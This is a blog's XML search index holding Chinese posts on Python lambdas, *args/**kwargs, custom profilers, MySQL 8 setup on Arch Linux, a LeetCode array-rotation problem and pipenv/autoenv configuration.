<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python 中的Lambda 函数:他们有什么用 （译）]]></title>
    <url>%2F2019%2F09%2F21%2Fpython-lambda-functions%2F</url>
    <content type="text"><![CDATA[本文用于练习英文阅读，如有侵权，联系删除 原文链接是Dan Bader的 Lambda Functions in Python: What Are They Good For? 以下为译文Python lambda 表达式: 它们的优点，何时使用以及何时最好避免使用他们。 Python中的lambda关键词提供了声明简短匿名函数的快捷方式。Lambda 函数的行为就像使用def关键字声明的常规函数一样。只要函数对象被声明就可以使用。 例如，这是定义一个加法功能的简单lambda函数:123&gt;&gt;&gt; add = lambda x, y: x + y&gt;&gt;&gt; add(5, 3)8 你也可以使用def关键字声明同样的加法函数：1234&gt;&gt;&gt; def add(x, y):... return x + y&gt;&gt;&gt; add(5, 3)8 现在你可能感到惊奇:为什么对lambdas大惊小怪？如果它只是def声明函数的简洁版，有什么大不了的？ 看下面这个例子，并把执行这个操作时把这个函数表达式放在脑海里:12&gt;&gt;&gt; (lambda x, y: x + y)(5, 3)8 好的，这是怎么回事？我只是用lambda内联定义了一个add 函数，接着用参数5和3进行了调用。 从概念上讲lambda表达式 lambda x,y:x+y 和用def声明的函数类似，只是用了内联写法。区别在于使用它之前没有绑定到诸如add这样的名称上。我只是说了我想计算的表达式，接着像常规函数一样调用它立刻求值。 在你继续之前，你可能需要玩味一下前面的代码示例，以便真的理解它的意思。我仍然记得这花了好久去思考。所以要担心花费几分钟去理解它。 lambdas 和常规函数的另一个语法不同在于:Lamdba 只能是单个表达式。这意味着lambda函数不能使用声明和注释，甚至return语句。 那么该如何使lambdas返回值？执行lambda函数会评估其表达式，然后自动返回结果。因此，总会有一个隐式的return语句。这就是为什么有些人将lambda称为单表达式函数的原因。 Lambda的使用什么时候你可以使用lambda函数在你的代码中？从技术上讲，任何只要希望提供函数对象的时候都可以使用lambda表达式。并且因为lambda表达式是可以匿名的，你甚至不需要声明它。 这提供一个方便的非官方的快捷定义Python函数的方法。我最常用到的lambda示例是按照指定键指定规则进行排序：12&gt;&gt;&gt; sorted(range(-5, 6), key=lambda x: x ** 2)[0, -1, 1, -2, 2, -3, 3, -4, 4, -5, 5] 像常规函数一样，lambda也可以用作词法闭包。 什么是词法闭包？只是对一种特殊的函数功能的称呼。即使程序流不再位于该作用域，他也能记住封闭的词法作用域的值。这是一个（很学术）的例子来说明这个想法:12345678910&gt;&gt;&gt; def make_adder(n):... return lambda x: x + n&gt;&gt;&gt; plus_3 = make_adder(3)&gt;&gt;&gt; plus_5 = make_adder(5)&gt;&gt;&gt; plus_3(4)7&gt;&gt;&gt; plus_5(4)9 在上面例子中 即使 lambda x+n 包含在 make_adder 函数的的作用域中，仍然可以访问n的值。 有时，使用lambda函数代替使用def声明的嵌套函数可以更清晰地表达自己的意图。但是，老实说这并不常见————至少我很少这么写代码。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[揭秘 Python args 和 kwargs （译）]]></title>
    <url>%2F2019%2F09%2F15%2Fpython-kwargs-and-args%2F</url>
    <content type="text"><![CDATA[本文用于练习英文阅读，如有侵权，联系删除 原文链接是Davide MastromatteoPython args and kwargs: Demystified 以下为译文有时，当你在查看Python函数定义的时候，你可能会看到这两个奇怪的参数: *args 和 **kwargs 。如果你想知道这两个特殊的变量名是什么，或者你的IDE(集成开发环境)为什么在main()函数里定义他们，这篇文章适合你，你将学到如何使用args和kwargs让你的Python函数定义更灵活。 读完这篇文章，你将了解: *args 和 **kwargs 的实际意思 如何使用 *args 和 **kwargs 定义函数 如何使用单星号(*) 解包迭代 如何使用双星号(**) 解包字典 本文假设你已经知道如何定义Python函数和列表字典 将多个参数传递给函数*args 和 **kwargs 允许你将多个参数或关键字参数传给一个字典。思考下面这个例子。这是一个给定两个参数返回他们的和的简单函数。123def my_sum(a, b): return a + b 这个函数工作正常，但是他只能接收两个参数。如果你需要对不同数量的参数进行计算，如果传递的参数的个数仅在运行时才能确定，该怎么办？创建一个不管传递多少整数都可以顺利求和的函数会更好。 在函数定义中使用 Python args变量有几种方法可以帮你传递不同数量的参数给函数。对于有一些集合经验的人来说，第一种方式最符合直觉。你住需要简单的将List(列表)或者Set（集合）所有的参数传递给你的函数。因此，对于my_sum(),你可以传递需要添加的所有整数的列表：123456789# sum_integers_list.pydef my_sum(my_integers): result = 0 for x in my_integers: result += x return resultlist_of_integers = [1, 2, 3]print(my_sum(list_of_integers)) 它可以有效的工作，但是你每次调用这个函数都需要创建一个列表传进来。这很不方便，尤其是你可能并不能事先知道所有需要放入列表的值。 这是*args非常有用的地方，因为它允许你传递不同数量的位置参数，示例如下：123456789# sum_integers_args.pydef my_sum(*args): result = 0 # Iterating over the Python args tuple for x in args: result += x return resultprint(my_sum(1, 2, 3)) 在这个例子里，你不再传递列表给my_sum().相反，你传递了3个不同的位置参数。my_sum获取所有提供的参数所谓输入打包他们放到一个可迭代对象 args中。 注意，args只是一个名称，你可以不使用args作为名称。你可以选择任何你喜欢的名字，像integers:12345678# sum_integers_args_2.pydef my_sum(*integers): result = 0 for x in integers: result += x return resultprint(my_sum(1, 2, 3)) 即使你将可迭代对象integers而不是args传递过去，这个函数仍然有效。这里最重要的是你要使用解包操作符(*)。 要记住，用解包操作获取的可迭代对象不是List(列表)而是一个元组(tuple)。元组类似与列表，他们都支持切片和迭代。但是元组有一个非常不同的地方，列表是可变的，元组不可变。要测试这一点，可以运行以下代码。下面这个脚本尝试改变列表的值。123my_list = [1, 2, 3]my_list[0] = 9print(my_list) 这个位于列表的第一个索引值应该被更新为9。如果你执行这个脚本，你将看到列表确实被修改了。12$python change_list.py[9, 2, 3] 第一个值不再是0，被更新成了9.现在尝试用元组做相同的事情。1234# change_tuple.pymy_tuple = (1, 2, 3)my_tuple[0] = 9print(my_tuple) 这里，你将看到同样的值，除了他们是用元组组合在一起。如果你尝试执行这个脚本，你将看到Python解释器返回一个错误:12345$python change_tuple.pyTraceback (most recent call last): File "change_tuple.py", line 3, in &lt;module&gt; my_tuple[0] = 9TypeError: 'tuple' object does not support item assignment 这是因为元组是一个不可变对象，它的值在赋值后不能再被修改。当你使用元组和*args时，请记住这一点。 使用Python kwargs 变量定义函数好的，现在你已经明白了 *args的用途,但**kwargs呢?**kwargs工作方式和*args 差不多，但是它不接收位 print(concatenate(a=”Real”, b=”Python”, c=”Is”, d=”Great”, e=”!”))1234当你执行上面脚本，concatenate() 将遍历所有Python kwargs字典 并连接它找到的所有值:```bash$python concatenate.pyRealPythonIsGreat! 如同 args ，kwargs 可以改成任何你想改成的值。同样，最重要的是解包操作符(**)。 所以，前面那个例子可以写成下面这种形式:12345678# concatenate_2.pydef concatenate(**words): result = "" for arg in words.values(): result += arg return resultprint(concatenate(a="Real", b="Python", c="Is", d="Great", e="!")) 注意,上面这个例子迭代一个标准字典对象。如果迭代字典并像上面那样返回所有值，如示例，你必须使用.values()。 事实上，如果你忘了这种使用方法。你将发现自己迭代的是Python kwargs 字典的键，如下示例：123456789# concatenate_keys.pydef concatenate(**kwargs): result = "" # Iterating over the keys of the Python kwargs dictionary for arg in kwargs: result += arg return resultprint(concatenate(a="Real", b="Python", c="Is", d="Great", e="!")) 注意，如果你尝试执行这个例子，你将注意到一下输出12$ python concatenate_keys.pyabcde 如你所见，如果你没有指定.values()，你的函数将迭代Python kwargs字典的键值，返回错误的结果。 函数参数顺序现在，你学习了*args和**kwargs的用途，你就可以使用它们开始编写传入不同数量参数的函数了，但是如果你想创建一个传入可变数量的位置参数和命名参数，怎么办？ 在这种情况下，你必须记住参数顺序，就像非默认参数必须在默认参数前面，*args 也必须在 **kwargs前面。 总结一下，参数的正确顺序: 标准参数 *args 参数 **kwargs 参数 例如，下面这个函数定义正确:123# correct_function_definition.pydef my_function(a, b, *args, **kwargs): pass 这个*args 应该在 **kwargs前面列出。但是如果你尝试修改参数的顺序？例如，请思考下面这个函数:123# wrong_function_definition.pydef my_function(a, b, **kwargs, *args): pass 现在，**kwargs 被放在*args 函数定义前面。如果你尝试运行这个例子，解释器将报错:12345$ python wrong_function_definition.py File "wrong_function_definition.py", line 2 def my_function(a, b, **kwargs, *args): ^SyntaxError: invalid syntax 在这种情况，*args 被放在**kwargs前面，Python 解释器将报语法错误。 通过星号操作 * ＆ ** 解码你现在能够用 *args 和 **kwargs 去定义可以传递可变数量参数的Python 函数。让我们来深入了解一下关于解包操作符的更多知识。 在Python2中引入了单星号和双星号解包操作符。从Python 3.5 开始，由于PEP 448而变得更强大。简而言之，解包操作符可以解包获取Python里可以迭代的对象。单星号操作符 * 可以在所有Python提供的可迭代对象中使用，双星号操作符 ** 只能在字典中使用。 让我们看个例子“123# print_list.pymy_list = [1, 2, 3]print(my_list) 这个代码定义了一个列表并打印到标准输出里:12$ python print_list.py[1, 2, 3] 注意，这个列表的打印方式，以及相应的括号和逗号。 现在，尝试将解包操作符 * 放到你的列表名前面:123# print_unpacked_list.pymy_list = [1, 2, 3]print(*my_list) 在这里，解包运算符* 告诉print() 先解包这个列表在这种情况，输出不再是列表本身，而是列表的内容:12$ python print_unpacked_list.py1 2 3 你可以看出这个与之前执行的print_list.py的区别么？除了列表外，print() 还使用了三个单独的参数做为输入。 你会注意到另一个事实是 ，在print_unpakced_list.py中 ，你是用解包操作符* 去调用函数，而不是在定义函数中，在这种情况 print() 会将列表中所有元素视为单个独立的参数。 你也可以使用这个方法调用你自己的函数，但是如果你的函要求特定数量的参数，这个可解包的迭代对象必须拥有同样数量的参数。 为了测试这个行为，考虑这个脚本：123456# unpacking_call.pydef my_sum(a, b, c): print(a + b + c)my_list = [1, 2, 3]my_sum(*my_list) 这里,my_sum() 明确指出要求a,b,c三个参数。如果你运行这个脚本，你将得到my_list 里这三个数的和:12$ python unpacking_call.py6 my_list 的三个元素和my_sum 要求的参数正好匹配。 现在让我们跟随这个脚本，当我的my_list 里有4个参数而不是3个会怎样:123456# wrong_unpacking_call.pydef my_sum(a, b, c): print(a + b + c)my_list = [1, 2, 3, 4]my_sum(*my_list) 这个例子，my_sum 仍然只需要3个参数，但是* 操作给了4个元素，如果你尝试执行这个脚本，你将看到Python 解释器无法运行它:12345$ python wrong_unpacking_call.pyTraceback (most recent call last): File "wrong_unpacking_call.py", line 6, in &lt;module&gt; my_sum(*my_list)TypeError: my_sum() takes 3 positional arguments but 4 were given 当你使用*操作符去解包一个列表并作为参数传递给函数时，就像你要单独把每一个参数传递进去一样。这意味着你可以使用多个解包操作符去从几个列表中获取值并把他们一起传递给一个函数。 为了测试这个特性，思考下面的例子：123456789101112# sum_integers_args_3.pydef my_sum(*args): result = 0 for x in args: result += x return resultlist1 = [1, 2, 3]list2 = [4, 5]list3 = [6, 7, 8, 9]print(my_sum(*list1, *list2, *list3)) 如果你运行这个例子，这3个列表都被解包。每一个元素都被传递到my_sum(),从而产生下面这个输出:12$ python sum_integers_args_3.py45 解包操作符还有其他实用用法。例如，结舌你需要把一个列表分割成三个不同部分，这个输出应该显示第一个值，最后一个值，和中间所有的值。通过解包操作符号，你可以只用一行代码做到：12345678# extract_list_body.pymy_list = [1, 2, 3, 4, 5, 6]a, *b, c = my_listprint(a)print(b)print(c) 在这个例子,my_list 包含6个元素。第一个值分配给a，最后一个值分配给c，剩下所有其他元素分配给新列表b。如果你运行这个脚本，print() 将如你预期的打印这3个变量: 1234$ python extract_list_body.py1[2, 3, 4, 5]6 使用解包操作符* 可以做的另一件事就是分割任何可以迭代的对象。如果你需要合并两个列表，这可能非常有用:123456# merging_lists.pymy_first_list = [1, 2, 3]my_second_list = [4, 5, 6]my_merged_list = [*my_first_list, *my_second_list]print(my_merged_list) 解包操作符* 被放在 my_first_list 和my_second_list 前面： 如果你运行这个脚本，看到的结果是列表被合并了:12$ python merging_lists.py[1, 2, 3, 4, 5, 6] 你也可以用使用解包操作符**去合并两个字典:123456# merging_dicts.pymy_first_dict = &#123;"A": 1, "B": 2&#125;my_second_dict = &#123;"C": 3, "D": 4&#125;my_merged_dict = &#123;**my_first_dict, **my_second_dict&#125;print(my_merged_dict) 在这里可迭代对象是 my_first_dict 和 my_second_dict。 执行这个代码输出合并字典:12$ python merging_dicts.py&#123;'A': 1, 'B': 2, 'C': 3, 'D': 4&#125; 记住这个*操作符可以用于任何可迭代对象，它也可以迭代一个字符串。123# string_to_list.pya = [*"RealPython"]print(a) 在Python里，字符串也是一个可迭代对象，所以*将解包所有单个值放在列表a中：12$ python string_to_list.py['R', 'e', 'a', 'l', 'P', 'y', 't', 'h', 'o', 'n'] 前面的示例看起来不错，但是当你使用这些运算符时，请务必记住Tim Peters撰写的《Python之禅》的第七条：可读性很重要。 要了解原因，请思考以下代码:123# mysterious_statement.py*a, = "RealPython"print(a) 有解包运算符*,后面跟着变量，逗号，和赋值号。被打包成一行！事实上，这和之前那个例子没有什么不同。只是RealPython字符串被赋值到新列表a中，感谢解包操作符*。 a后面的逗号可以解决问题，当你使用解包操作给变量赋值时，Python要求你的结果变量是列表或元组。逗号结尾，你实际只定义了一个变量名为a的元组。 尽管这是一个非常巧妙的技巧，很多Pythonistas(更Python风格的使用者)都不认为这样的代码有很好的可读性，因此，最好谨慎使用这种数据结构。 结论你现在可以使用 *args和 **kwargs去接受可变数量的参数在你的函数里。你也了解了更多关于解包操作符的知识。 你已经了解了： *args 和**kwargs 的含义 如何使用 *args 和 **kwargs 定义函数 如何使用单星号(*)解包可迭代对象 如何使用双星号(**)解包字典]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分析Python程序性能 （译）]]></title>
    <url>%2F2019%2F09%2F07%2Fcustom-python-profiler%2F</url>
    <content type="text"><![CDATA[本文用于练习英文阅读，如有侵权，联系删除 原文链接是Itamar Turner-Trauring写的Not just CPU:writing custom profilers for Python 以下为译文如果你的程序运行缓慢，并且你确定仅部分归因于CPU,你该如何确定代码的那一部分正在等待CPU以外的时间呢？ 在本文中，你将学习如何编写自定义的分析器，并帮你精确分析定位代码运行具体消耗的时间。特别的，我们将讨论: 你的程序具体时间消耗情况 分析非CPU等待时间 分析非自愿上下文切换消耗的时间 你的程序在等待什么？有些时候你的程序时间花费在CPU以外的地方，可能是: 网络通讯.可能包括DNS查询，等待对方响应，等待所有数据加载完成，等等。 硬盘读写. 从硬盘读写数据需要一些延迟，有时会先写入内存缓存，这很快。有时会直接写入硬盘，比较慢。 锁.程序也可能等待线程/进程锁释放 睡眠.有时你的程序会主动等待，比如等待一段时间后重试或退出。 那如何找到这些具体发生了什么操作呢？ 技巧＃1 非CPU运行时间Python 内置的cProfile 分析器可以分析你的程序调用情况，你可以用它分析非CPU时间占用情况。 正如我上一篇文章中所讨论的那样，你的操作系统可以告诉你程序使用了CPU多少秒。 让我们假设有一个单线程程序(多线程程序更难分析和推理),如果你的程序运行共花费了9秒，使用了7.5秒的CPU,这意味着有1.5秒花费在等待上。 首先，构建一个测量非CPU时间的计时器： 12345import osdef not_cpu_time(): times = os.times() return times.elapsed - (times.system + times.user) 接着，创建一个使用上面新创建的计时器的分析器。12345678import cProfile, pstatsdef profile_not_cpu_time(f, *args, **kwargs): prof = cProfile.Profile(not_cpu_time) prof.runcall(f, *args, **kwargs) result = pstats.Stats(prof) result.sort_stats("time") result.print_stats() 现在，你可以用它分析各种函数。123456789101112131415from urllib.request import urlopen#分析打开一个网页profile_not_cpu_time( lambda: urlopen("https://pythonspeed.com").read())#结果 659 function calls (658 primitive calls) in 0.640 seconds Ordered by: internal time ncalls tottime percall filename:lineno(function) 3 0.050 0.017 _ssl._SSLSocket.read 1 0.040 0.040 _socket.getaddrinfo 1 0.020 0.020 _socket.socket.connect 1 0.010 0.010 _ssl._SSLSocket.do_handshake 342 0.010 0.000 find.str 192 0.010 0.000 append.list 我们可以看到大多数时间花费在了从套接字读取上(read)，但DNS查询(getaddrinfo),TCP握手(connect),以及TLS/SSL握手也需要一些时间。 由于我们小心避免了计算CPU时间，我们可以知道这纯粹是等待时间，不包含CPU占用花费。 注意:为什么会有str.find 和list.append? 他们不需要任何等待，所以这可能是整个程序没有被运行，也可能因为某些其他程序安排的运行，或者是有时需要从swap交换分区加载到内存里。这意味着发生一些时间消耗，但并不算在CPU占用时间里。 技巧#2 主动上下文切换测量非CPU占用时间可能因为一些不受程序控制的行为，导致结果有些不同。有时DNS查询会变得很慢，有时下载花费的时间会很长。因此我们想使用一个更精准的测量方式，它不受外部条件变化影响。 要做到这一点的方法之一是 测量进程做了多少次需要等待的操作：计算等待次数，而不是等待时间。 这是你如何去做。当你的进程停止使用CPU资源，可能有一下两个原因: 1. 每次作一个不会立刻返回结果的操作,诸如 读取socket(套接字)，sleeping(休眠)等等，他会告诉操作系统:&quot;等返回结果了再唤醒我&quot;这是“主动上下文切换”,CPU可以切换运行其他的程序，直到从socket里读取到了数据，休眠结束等等再切换回来。 2. 被动上下文切换， 这时操作系统暂时停止运行这个进程，以运行其他需要使用CPU的进程。 因此，出于我们的目的，我们想分析主动上下文切换所花费的时间。 你可以使用psutil库去写一个分析器，测量主动上下文切换消耗1234567891011import psutil_current_process = psutil.Process()def profile_voluntary_switches(f, *args, **kwargs): prof = cProfile.Profile( lambda: _current_process.num_ctx_switches().voluntary) prof.runcall(f, *args, **kwargs) result = pstats.Stats(prof) result.sort_stats("time") result.print_stats() 你可以再次分析网络请求的代码12345678910111213from urllib.request import urlopen#分析打开一个网页profile_voluntary_switches( lambda: urlopen("https://pythonspeed.com").read())#结果ncalls tottime percall filename:lineno(function) 3 7.000 2.333 _ssl._SSLSocket.read 1 2.000 2.000 _ssl._SSLSocket.do_handshake 1 2.000 2.000 _socket.getaddrinfo 1 1.000 1.000 _ssl._SSLContext.set_default_verify_path 1 1.000 1.000 _socket.socket.connect 现在看到的不是花费的等待时间，而是主动上下文切换发生的次数。 分析所有消耗使用分析技术会带来一些额外成本:因为额外的开销导致你的程序变慢一些。大多数情况对结果影响不大，因为你没有分析CPU。 通常，你可以分析任何数据。例如: 读操作(psutil.Process().read_count)和写操作(psutil.Process().write_count))数 在Linux上，读写的总字节数( psutil.Process().read_chars) 内存分配分析(这需要一些额外的工作，但也可以使用 jemalloc) 你也可以看psutil的文档进一步了解上面两点。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 8.0.16 安装配置(Arch Linux)]]></title>
    <url>%2F2019%2F07%2F06%2Fmysql8%2F</url>
    <content type="text"><![CDATA[MySQL与MariaDBMariaDB 是 MySQL 的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。所以现在主流的 Linux 发行版基本都默认使用 MariaDB 作为默认的 MySQL 实现。ArchLinux 已经将Oracle的MySQL移至AUR 中。 安装 yay -S mysql #根据说明初始化MySQLsudo mysqld –initialize –user=mysql –basedir=/usr –datadir=/var/lib/mysql # 此操作会给你生成一个随机root密码(临时)#启动 mysql 服务sudo systemctl start mysqld#可以进行一些安全设置，更改root密码，设置密码复杂度要求，禁止远程登录root帐号等 (建议)mysql_secure_installation 可能遇到的问题 error while loading shared libraries: libicuuc.so.63: cannot open shared object file: No such file or directory目前(2019-05-21) Arch Linux 的ICU已经更新到64版了(Unicode组件标准库,以支持世界语言，实现最新版本的Unicode编码标准和Unicode区域设置数据)，而AUR仓库里的MySQL还依赖icu63版，这里可以去AUR仓库里安装icu63版。 yay -S icu63 配置 MySQL配置文件说明里不建议直接编辑默认配置文件, 我们可以自定义一个配置文件，追加到/etc/mysql/my.cnf #加载我们自定义的配置文件 /etc/mysql/myl.cnfsudo tee -a /etc/mysql/my.cnf &lt;&lt;&lt; “!include /etc/mysql/myl.cnf” 编辑配置文件 sudo vim /etc/mysql/myl.cnf1234567891011121314151617 [mysql] #配置mysql 命令提示符前缀 [主机名][用户名]@[数据库名] (当前时间) prompt=[\h][\u]@[\d] (\R:\m)&gt; #开启自动补全 / no-auto-rehash 关闭 auto-rehash[mysqld] #事务隔离级别:读提交 transaction-isolation=READ-COMMITTED #持久化 redolog 到磁盘，保证异常重启不丢数据 默认１,0关闭 innodb_flush_log_at_trx_commit=1 #持久化 binlog,保证异常重启不丢日志 默认１ sync_binlog=1 常用操作重置 MySQL root 密码现在主流Linux发行版基本全部使用systemd作为系统和服务管理器,可以使用systemd 配置 mysqld服务，不再使用mysql_safe。 停止mysqld守护进程 sudo systemctl stop mysqld 配置MYSQLD_OPTS环境变量(不启用授权表，不启用网络环境) sudo systemctl set-environment MYSQLD_OPTS=”–skip-grant-tables –skip-networking” 重新启动mysql sudo systemctl start mysqld 使用空密码重新登录root账户 mysql -u root -p 清空root 密码 UPDATE mysql.user SET authentication_string=null WHERE User=’root’; 取消特权模式，重新启动mysqld服务 sudo systemctl unset-environment MYSQLD_OPTSsudo systemctl restart mysqld 更新 root 密码 为 1234 mysql -u root -puse mysqlALTER USER ‘root‘@’localhost’ IDENTIFIED WITH caching_sha2_password BY ‘1234’; 添加新用户并授权 创建 名为test 密码为123，支持远程登录(%), 使用旧版MySQL密码认证算法(MySQL8引入caching_sha2_password, 之前版本使用mysql_native_password)的用户 CREATE USER ‘test‘@’%’ IDENTIFIED WITH mysql_native_password BY ‘123’; 授权 test 用户对test 数据库拥有所有权限 GRANT ALL ON test.* TO ‘test‘@’%’; 深入学习 《MySQL必知必会》 数据库设计那些事 MySQL实战45讲 《高性能MySQL》 参考 https://stackoverflow.com/questions/33510184/change-mysql-root-password-on-centos7/34207996#34207996 https://wiki.archlinux.org/index.php/MariaDB_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) https://dev.mysql.com/doc/refman/8.0/en/option-files.html https://time.geekbang.org/column/article/68633 https://stackoverflow.com/questions/50691977/how-to-reset-the-root-password-in-mysql-8-0-11 https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode 136：旋转数组[初级]]]></title>
    <url>%2F2018%2F08%2F07%2Fleetcode-136%2F</url>
    <content type="text"><![CDATA[题目189：旋转数组 给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 示例1: 输入: [1,2,3,4,5,6,7] 和 k = 3 输出: [5,6,7,1,2,3,4] 解释: 向右旋转 1 步: [7,1,2,3,4,5,6] 向右旋转 2 步: [6,7,1,2,3,4,5] 向右旋转 3 步: [5,6,7,1,2,3,4] 示例2: 输入: [-1,-100,3,99] 和 k = 2 输出: [3,99,-1,-100] 解释: 向右旋转 1 步: [99,-1,-100,3] 向右旋转 2 步: [3,99,-1,-100] 说明: * 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 * 要求使用空间复杂度为 O(1) 的原地算法。 分析 方法一:空间复杂度O(n)首先想到的就是切片，以[-1,-100,3,99]，k=2 为例： 先用[-2:]拿到 [3,99]，再用[:-2]得到剩下的[-1,-100] 1234567def rotate(self, nums, k): """ :type nums: List[int] :type k: int :rtype: void Do not return anything, modify nums in-place instead. """ nums = nums[-k:] + nums[:-k] 提交以后才发现结果不对，这才想起nums此时其实是一个新建的局部变量，不影响原来的List，修改如下1234def rotate(self, nums, k): new_nums = nums[-k:] + nums[:-k] for i in range(len(nums)): nums[i] = new_nums[i] 还是没有考虑全，还有nums=[1,2,3],k=5这种k&gt;len(nums)的情况，我们进行取模运算，最终代码：123456def rotate(self, nums, k): length = len(nums) i = k%length new_nums = nums[-i:] + nums[:-i] for i in range(len(nums)): nums[i] = new_nums[i] 看了别的提交的代码后发现可以用Python浅拷贝的魔法糖list[:],它等价于list.copy()：只复制对象地址，而非完整对象资源。1234def rotate(self, nums, k): i = len(nums) - k nums[:] = nums[i:] + nums[:i] 方法2:空间复杂度O(1)按题目要求，我们可以用这个思路：删除最后一个元素，把最后一个元素的内容插入到List的开头位置 12345def rotate(self,nums,k): while k: tail = nums.pop() nums.insert(0,tail) k -=1 日常使用的话,标准集合库collections里deque(双向列表)提供了旋转数组的方法:rotate 123from collections import dequed = deque([1,2,3,4,6])d.rotate(3)]]></content>
      <tags>
        <tag>leetcode,python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode 189：旋转数组[初级]]]></title>
    <url>%2F2018%2F08%2F07%2Fleetcode-189%2F</url>
    <content type="text"><![CDATA[题目189：旋转数组 给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 示例1: 输入: [1,2,3,4,5,6,7] 和 k = 3 输出: [5,6,7,1,2,3,4] 解释: 向右旋转 1 步: [7,1,2,3,4,5,6] 向右旋转 2 步: [6,7,1,2,3,4,5] 向右旋转 3 步: [5,6,7,1,2,3,4] 示例2: 输入: [-1,-100,3,99] 和 k = 2 输出: [3,99,-1,-100] 解释: 向右旋转 1 步: [99,-1,-100,3] 向右旋转 2 步: [3,99,-1,-100] 说明: * 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 * 要求使用空间复杂度为 O(1) 的原地算法。 分析 方法一:空间复杂度O(n)首先想到的就是切片，以[-1,-100,3,99]，k=2 为例： 先用[-2:]拿到 [3,99]，再用[:-2]得到剩下的[-1,-100] 1234567def rotate(self, nums, k): """ :type nums: List[int] :type k: int :rtype: void Do not return anything, modify nums in-place instead. """ nums = nums[-k:] + nums[:-k] 提交以后才发现结果不对，这才想起nums此时其实是一个新建的局部变量，不影响原来的List，修改如下1234def rotate(self, nums, k): new_nums = nums[-k:] + nums[:-k] for i in range(len(nums)): nums[i] = new_nums[i] 还是没有考虑全，还有nums=[1,2,3],k=5这种k&gt;len(nums)的情况，我们进行取模运算，最终代码：123456def rotate(self, nums, k): length = len(nums) i = k%length new_nums = nums[-i:] + nums[:-i] for i in range(len(nums)): nums[i] = new_nums[i] 看了别的提交的代码后发现可以用Python浅拷贝的魔法糖list[:],它等价于list.copy()：只复制对象地址，而非完整对象资源。1234def rotate(self, nums, k): i = len(nums) - k nums[:] = nums[i:] + nums[:i] 方法2:空间复杂度O(1)按题目要求，我们可以用这个思路：删除最后一个元素，把最后一个元素的内容插入到List的开头位置 12345def rotate(self,nums,k): while k: tail = nums.pop() nums.insert(0,tail) k -=1 日常使用的话,标准集合库collections里deque(双向列表)提供了旋转数组的方法:rotate 123from collections import dequed = deque([1,2,3,4,6])d.rotate(3)]]></content>
      <tags>
        <tag>leetcode,python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终极 Python Project 管理方案：pipenv + autoenv]]></title>
    <url>%2F2018%2F07%2F26%2Fpipenv%2F</url>
    <content type="text"><![CDATA[前言使用过pip的同学都知道它的强大与方便，但学习的时候免不了安装各种各样的库，最后需要导出依赖的时候才发现无从下手，virtualenv便是为了解决此问题而诞生的，但若有很多项目，构建虚拟环境并手动切换，也是个繁琐的工作，好在有了更强大的解决方案：pipenv(项目依赖管理器)+autoenv(自动激活环境)。 演示环境 Arch Linux + zsh + python3 + pip3 pipenvpipenv 是Kenneth Reitz编写的一个用于创建和管理Python虚拟环境的新工具 安装 pip install pipenv –user #推荐安装到个人目录 手动添加python的bin目录到$PATH变量中 1234567python -m site --user-base #查看pip 安装路径&gt; /home/taoist/.local #这是我的路径# 编辑 ~/.zshrc 在最后一行添加export PATH=$PATH:/home/taoist/.local/bin #注意到binsource ~/.zshrc ＃重新载入终端配置文件 使用 123mkdir test_project #新建一个空目录cd test_project pipenv install #创建一个新的虚拟环境 安装 12pipenv install requests #手动安装requests库pipenv install -r requirements.txt #根据requirements.txt 自动安装库依赖 运行虚拟环境 123pipenv run python xxx.py #用虚拟环境运行 xxx.py pipenv shell #激活shell虚拟环境exit #退出当前虚拟环境 删除 12pipenv uninstall requests #删除requests库pipenv --rm #移除此项目 其他 123pipenv graph #查看包依赖pipenv check #检查编码风格 与安全隐患pipenv lock -r #生成requirements.txt 文件 更多使用请参考官方文档 其他 使用国内pypi镜像加速下载 12345#编辑配置文件，更改url 使用豆瓣镜像vim Pipfile [[source]]url = "https://pypi.douban.com/simple" 将venv环境文件放到当前目录，默认在用户目录 1echo "export PIPENV_VENV_IN_PROJECT=1" &gt;&gt; ~/.zshrc 开启zsh 对 pipenv 的自动补全功能 12echo 'eval "$(pipenv --completion)"' &gt;&gt; ~/.zshrcsource ~/.zshrc 自动激活虚拟环境,需要写入.env 文件 1echo "pipenv shell" &gt; .env #将环境配置写入到 .env 文件中 autoenv当您 cd 进入一个包含 .env 的目录中，就会 autoenv 自动激活那个环境。 安装 pip install autoenv 1234#激活echo "source `which activate.sh`" &gt;&gt; ~/.zshrc #zsh shell 激活autoenv source ~/.zhsrc #重新载入配置 使用配置完成，以后cd到项目目录后，就会自动激活虚拟环境了，如果是第一次进入，会提示你是否允许自动激活，输入 y ，回车确认即可。z 参考 https://pythonguidecn.readthedocs.io/zh/latest/dev/virtualenvs.html http://www.dongwm.com/archives/%E4%BD%BF%E7%94%A8pipenv%E7%AE%A1%E7%90%86%E4%BD%A0%E7%9A%84%E9%A1%B9%E7%9B%AE/ https://www.jianshu.com/p/8c6ae288ba48 https://zhuanlan.zhihu.com/p/31056585]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0025]]></title>
    <url>%2F2018%2F06%2F16%2Fpython-exercise-0025%2F</url>
